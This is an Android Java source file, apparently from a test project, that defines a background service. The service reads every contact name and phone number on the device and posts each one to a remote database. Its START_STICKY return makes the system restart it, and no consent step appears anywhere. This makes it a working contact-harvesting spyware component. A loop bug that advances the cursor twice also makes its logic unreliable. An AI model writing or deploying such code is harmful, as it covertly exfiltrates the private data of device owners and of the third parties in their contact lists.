package com.test.myapplication.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;

import com.test.myapplication.models.Contacts;
import com.test.myapplication.models.Messages;


public class SendAllContactsService extends Service {

    public void getAllContacts(){

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {

                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));


                        //CREATES A POST REQUEST SENDS TO DB
                        Contacts contacts = new Contacts(phoneNo.toString(),name.toString());
                        SendToDBService post = new SendToDBService(contacts.putsFieldsInJson(), contacts.uri).perform(this);

                        pCur.moveToNext();
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }



    @Override
    public int onStartCommand(Intent intent, int flags, int StartId){
        getAllContacts();
        return START_STICKY;
    }




    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


}
